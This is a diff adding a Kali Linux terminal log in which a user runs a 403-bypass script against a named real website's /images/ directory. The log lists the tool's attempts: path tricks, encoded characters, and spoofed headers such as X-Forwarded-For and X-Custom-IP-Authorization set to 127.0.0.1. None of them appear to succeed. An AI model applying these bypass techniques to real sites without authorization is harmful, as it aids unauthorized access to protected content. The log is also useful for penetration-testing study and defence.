@@ -1,0 +1,36 @@
+┌──(kali㉿kali)-[~/Downloads/byp4xx/bypass-403]
+└─$ ./bypass-403.sh 'https://www.dietapremium.pl/images/'
+ ____                                  _  _    ___ _____ 
+| __ ) _   _ _ __   __ _ ___ ___      | || |  / _ \___ / 
+|  _ \| | | | '_ \ / _` / __/ __|_____| || |_| | | ||_ \ 
+| |_) | |_| | |_) | (_| \__ \__ \_____|__   _| |_| |__) |
+|____/ \__, | .__/ \__,_|___/___/        |_|  \___/____/ 
+       |___/|_|                                          
+                                               By Iam_J0ker
+./bypass-403.sh https://example.com path
+ 
+403,559  --> https://www.dietapremium.pl/images//
+403,559  --> https://www.dietapremium.pl/images//%2e/
+403,559  --> https://www.dietapremium.pl/images///.
+403,559  --> https://www.dietapremium.pl/images/////
+403,559  --> https://www.dietapremium.pl/images//.//./
+403,559  --> https://www.dietapremium.pl/images// -H X-Original-URL: 
+403,559  --> https://www.dietapremium.pl/images// -H X-Custom-IP-Authorization: 127.0.0.1
+403,559  --> https://www.dietapremium.pl/images// -H X-Forwarded-For: http://127.0.0.1
+403,559  --> https://www.dietapremium.pl/images// -H X-Forwarded-For: 127.0.0.1:80
+403,559  --> https://www.dietapremium.pl/images/ -H X-rewrite-url: 
+404,12858  --> https://www.dietapremium.pl/images//%20
+404,12858  --> https://www.dietapremium.pl/images//%09
+403,559  --> https://www.dietapremium.pl/images//?
+404,12858  --> https://www.dietapremium.pl/images//.html
+403,559  --> https://www.dietapremium.pl/images///?anything
+403,559  --> https://www.dietapremium.pl/images//#
+403,559  --> https://www.dietapremium.pl/images// -H Content-Length:0 -X POST
+404,12858  --> https://www.dietapremium.pl/images///*
+404,12858  --> https://www.dietapremium.pl/images//.php
+404,12858  --> https://www.dietapremium.pl/images//.json
+405,128  --> https://www.dietapremium.pl/images//  -X TRACE
+403,559  --> https://www.dietapremium.pl/images// -H X-Host: 127.0.0.1
+404,12858  --> https://www.dietapremium.pl/images//..;/
+000,0  --> https://www.dietapremium.pl/images//;/
+                                                    
